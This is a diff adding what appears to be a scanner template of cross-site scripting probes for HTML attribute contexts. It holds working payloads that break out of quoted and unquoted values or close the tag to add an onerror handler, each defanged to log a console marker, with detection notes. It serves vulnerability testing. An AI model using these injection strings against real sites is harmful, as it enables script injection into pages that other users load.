@@ -1,0 +1,32 @@
+# Attribute values. The marker is computed or unique, never a literal the
+# request also carries; a reflected proof may raise a dialog, a stored one may
+# not, which is why every handler here logs rather than alerts.
+id: xss/htmlattr
+title: Attribute context escapes and handlers
+reviewed: "2026-08-31"
+variables: [MARKER]
+safety: >-
+  Each entry introduces one handler that fires on load and produces one marker.
+  Nothing navigates, submits or fetches. Use the console form for stored
+  delivery.
+entries:
+  - name: close a double-quoted value
+    payload: "\" onfocus=console.log('{{MARKER}}') autofocus x=\""
+    detect: "The handler fires without interaction. The trailing attribute absorbs the template's own closing quote so the element still parses."
+
+  - name: close a single-quoted value
+    payload: "' onfocus=console.log('{{MARKER}}') autofocus x='"
+    detect: "Same shape for a single-quoted template. Sending the wrong one reads as a clean result, which is why the probe records the quoting first."
+
+  - name: unquoted value
+    payload: " onfocus=console.log('{{MARKER}}') autofocus"
+    detect: "No quote is needed at all when the template leaves the value unquoted; a space alone introduces the attribute."
+    note: "The leading space terminates the value already there, so this needs the parameter's ordinary value in front of it. Sent into an empty unquoted attribute the parser takes the whole payload as the value -- the element gets one attribute and no handler, which reads as a clean negative."
+
+  - name: leave the attribute entirely
+    payload: "\"><img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "Where the element itself is not one that fires events, closing the tag and introducing a new element is the route."
+
+  - name: encoder control
+    payload: "\"{{MARKER}}\""
+    detect: "Read the raw body: an entity-encoded quote here is the attribute encoder working, and every entry above will fail for that reason rather than for any other."
